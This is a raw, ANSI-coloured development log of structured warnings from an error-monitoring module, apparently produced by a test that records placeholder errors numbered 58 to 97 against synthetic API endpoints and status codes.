WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686614Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 58'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686677Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 59'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686760Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 60'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 61'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 62'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686950Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 63'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687000Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 64'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687050Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 65'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687101Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 66'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687152Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 67'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687203Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 68'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687254Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 69'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 70'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687363Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 71'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687415Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 72'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687466Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 73'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687518Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 74'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687570Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 75'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687619Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 76'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687668Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 77'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 78'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687766Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 79'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687814Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 80'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687863Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 81'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 82'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.687961Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 83'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688008Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 84'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688057Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 85'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688105Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 86'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688153Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 87'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688200Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 88'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688248Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 89'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688296Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 90'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688345Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 91'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 92'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688443Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 93'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688491Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 94'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 95'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 96'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 97'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
